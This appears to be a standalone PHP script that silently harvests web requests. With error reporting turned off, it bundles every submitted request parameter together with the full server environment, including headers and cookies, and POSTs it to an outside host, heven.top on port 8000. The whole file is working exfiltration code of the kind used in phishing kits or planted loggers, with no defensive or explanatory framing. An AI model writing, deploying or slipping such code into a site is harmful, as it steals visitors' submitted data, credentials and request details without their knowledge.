<?php
error_reporting(0);
function post($url,$data){
  $ch = curl_init();

curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch,CURLOPT_HEADER,1);

curl_exec($ch);

curl_close($ch);
}


if($_REQUEST){
  // var_dump($_GET);exit;
  
  
  // $_REQUEST['ip'] = $ip;
  $_REQUEST['server'] = json_encode($_SERVER);
  // $_GET['user_agent']=$_SERVER['HTTP_USER_AGENT'];
// var_dump($_SERVER);exit;
  post("http://heven.top:8000/app/log",$_REQUEST);
// echo "操作完成";
}
